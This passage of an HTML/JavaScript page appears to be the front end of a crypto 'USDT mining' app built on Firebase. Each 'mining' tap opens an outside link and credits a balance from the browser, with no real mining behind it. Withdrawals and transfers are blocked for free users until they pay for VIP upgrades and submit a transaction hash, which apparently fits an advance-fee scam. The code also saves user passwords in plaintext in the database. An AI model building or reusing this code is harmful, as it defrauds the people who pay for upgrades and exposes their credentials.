            <input type="text" id="txidInput" placeholder="TxID / Hash" class="w-full p-4 rounded-xl mb-6 text-xs">
            <button onclick="submitUpgrade()" class="w-full gradient-cyan text-black font-black py-4 rounded-xl text-[10px] uppercase mb-3">Confirm Payment</button>
            <button onclick="closeModal('paymentModal')" class="text-gray-500 text-[10px] font-black uppercase">Cancel</button>
        </div>
    </div>

    <div id="historyModal" class="modal"><div class="glass p-8 w-full max-w-sm"><h2 class="text-lg font-black mb-6 text-center text-cyan-400 uppercase">Transaction Logs</h2><div id="historyList" class="space-y-3 max-h-[50vh] overflow-y-auto no-scrollbar"></div><button onclick="closeModal('historyModal')" class="w-full mt-6 text-gray-600 font-black uppercase text-[10px]">Close</button></div></div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBIM8Rp8REYjdPHZegCYBF5ikW6Xdcqeg4",
            authDomain: "usdt-72320.firebaseapp.com",
            projectId: "usdt-72320",
            databaseURL: "https://usdt-72320-default-rtdb.firebaseio.com",
            storageBucket: "usdt-72320.firebasestorage.app",
            messagingSenderId: "7688156181",
            appId: "1:7688156181:web:85ae9e18021d149627ca1c"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const database = firebase.database();
        let userData = null;
        let isMining = false;
        let selectedPlan = "";

        function handleAuth(type) {
            const e = document.getElementById('email').value.trim();
            const p = document.getElementById('password').value;
            if(!e || !p) return alert("Fill fields!");
            if(type === 'signup') {
                auth.createUserWithEmailAndPassword(e, p).then(c => {
                    const smallId = e.split('@')[0].substring(0, 5).toUpperCase() + Math.floor(1000 + Math.random() * 8999);
                    database.ref('users/' + c.user.uid).set({ uid: smallId, email: e, bal: 0, m: 10, tier: "VIP 0", pass: p });
                }).catch(err => alert(err.message));
            } else { auth.signInWithEmailAndPassword(e, p).catch(err => alert("Login Failed")); }
        }

        auth.onAuthStateChanged(user => {
            if(user) {
                document.getElementById('authSection').classList.add('hidden');
                document.getElementById('mainApp').classList.remove('hidden');
                database.ref('users/' + user.uid).on('value', s => { userData = s.val(); updateUI(); });
            } else { document.getElementById('authSection').classList.remove('hidden'); document.getElementById('mainApp').classList.add('hidden'); }
        });

        function updateUI() {
            if(!userData) return;
            document.getElementById('mainBal').innerText = userData.bal.toFixed(4);
            document.getElementById('uId').innerText = userData.uid;
            document.getElementById('mCount').innerText = userData.m;
            document.getElementById('vTag').innerText = userData.tier;
            let t = userData.tier.toUpperCase();
            let max = 10;
            if(t.includes("VIP 1")) max = 11;
            else if(t.includes("VIP 2")) max = 12;
            else if(t.includes("VIP 3")) max = 13;
            document.getElementById('mMax').innerText = max;
        }

        function startMining() {
            if(userData.m <= 0 || isMining) return alert("No Taps Left!");
            isMining = true; window.open("https://omg10.com/4/10714152", "_blank");
            const overlay = document.getElementById('timerOverlay');
            overlay.classList.remove('hidden'); overlay.classList.add('flex');
            let t = 8;
            const counter = setInterval(() => {
                t--; document.getElementById('timeText').innerText = t + "s";
                if(t <= 0) {
                    clearInterval(counter);
                    let r = 0.05; 
                    let v = userData.tier.toUpperCase();
                    if(v.includes("VIP 1")) r = 0.09;
                    else if(v.includes("VIP 2")) r = 0.13;
                    else if(v.includes("VIP 3")) r = 0.30;
                    database.ref('users/' + auth.currentUser.uid).update({ bal: userData.bal + r, m: userData.m - 1 });
                    overlay.classList.add('hidden'); isMining = false;
                }
            }, 1000);
        }

        function showPayment(plan, price) { selectedPlan = plan; document.getElementById('payNodeName').innerText = plan; closeModal('vipUpdateModal'); openModal('paymentModal'); }

        function submitUpgrade() {
            const txid = document.getElementById('txidInput').value.trim();
            if(txid.length < 5) return alert("Invalid TxID!");
            const now = new Date().toLocaleString();
            database.ref('upgrades/' + auth.currentUser.uid).set({ uid: userData.uid, plan: selectedPlan, txid: txid, status: "Pending", time: now }).then(() => {
                database.ref('history/' + auth.currentUser.uid).push({ type: "Upgrade Request", amount: selectedPlan, status: "Pending", txid: txid, time: now });
                alert("Request Sent!"); closeModal('paymentModal');
            });
        }

        // --- VIP 0 RESTRICTION ON TRANSFER ---
        function submitTransfer() {
            // Check VIP Level first
            if(userData.tier.toUpperCase() === "VIP 0") {
                return alert("Access Restricted: VIP 0 users cannot perform Transfers. Please upgrade to VIP 1 or higher.");
            }

            const fee = 0.01;
            const tUid = document.getElementById('trFriendUid').value.trim().toUpperCase();
            const amt = parseFloat(document.getElementById('trAmount').value);
            const pass = document.getElementById('trPass').value;

            if(!tUid || isNaN(amt) || amt <= 0) return alert("Check Inputs!");
            if(pass !== userData.pass) return alert("Wrong Password!");
            if(tUid === userData.uid) return alert("Cannot send to yourself!");

            const total = amt + fee;
            if(userData.bal < total) return alert("Insufficient Balance!");

            database.ref('users').once('value', snapshot => {
                let rKey = null; let rData = null;
                snapshot.forEach(c => { if(c.val().uid === tUid) { rKey = c.key; rData = c.val(); } });
                if(rKey) {
                    const now = new Date().toLocaleString();
                    database.ref('users/' + auth.currentUser.uid).update({ bal: userData.bal - total });
                    database.ref('users/' + rKey).update({ bal: rData.bal + amt });
                    database.ref('history/' + auth.currentUser.uid).push({ type: "Transfer Sent", amount: "-" + amt.toFixed(2), status: "Complete", time: now });
                    database.ref('history/' + auth.currentUser.uid).push({ type: "Fee", amount: "-0.01", status: "Complete", time: now });
                    database.ref('history/' + rKey).push({ type: "Transfer Received", amount: "+" + amt.toFixed(2), status: "Complete", time: now });
                    alert("Transfer Success!"); closeModal('transferModal');
                } else alert("UID Missing!");
            });
        }

        // --- VIP 0 RESTRICTION ON WITHDRAW ---
        function submitWithdraw() {
            // Check VIP Level first
            if(userData.tier.toUpperCase() === "VIP 0") {
                return alert("Access Restricted: VIP 0 users cannot perform Withdrawals. Please upgrade your Mining Node.");
            }

            const amt = parseFloat(document.getElementById('wdAmount').value);
            const addr = document.getElementById('wdAddress').value.trim();
            if(amt < 10 || isNaN(amt)) return alert("Min 10 USDT!");
            if(userData.bal < amt) return alert("Insufficient Balance!");
            if(addr.length < 10) return alert("Invalid Address!");
            
            const now = new Date().toLocaleString();
            database.ref('withdrawRequests').push({ uid: userData.uid, amount: amt, address: addr, status: "Pending", time: now }).then(() => {
                database.ref('history/' + auth.currentUser.uid).push({ type: "Withdraw Request", amount: "-" + amt.toFixed(2), status: "Pending", time: now });
                alert("Withdrawal Requested!"); closeModal('withdrawModal');
            });
        }

        function openHistory() {
            const list = document.getElementById('historyList'); list.innerHTML = "Syncing..."; openModal('historyModal');
            database.ref('history/' + auth.currentUser.uid).on('value', s => {
                list.innerHTML = "";
                if(!s.exists()) { list.innerHTML = "No Records Found"; return; }
                let logs = []; s.forEach(c => { logs.push(c.val()); }); logs.reverse();
                logs.forEach(h => {
                    list.innerHTML += `<div class="bg-white/5 p-4 rounded-2xl border border-white/5"><div class="flex justify-between"><span class="text-white font-black text-[10px] uppercase">${h.type}</span><span class="text-white font-black text-xs">${h.amount}</span></div><div class="flex justify-between mt-1"><span class="text-[7px] text-gray-500 uppercase">${h.time}</span><span class="text-yellow-500 text-[8px] uppercase font-bold">${h.status}</span></div></div>`;
                });
            });
        }

        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
    </script>
</body>
</html>
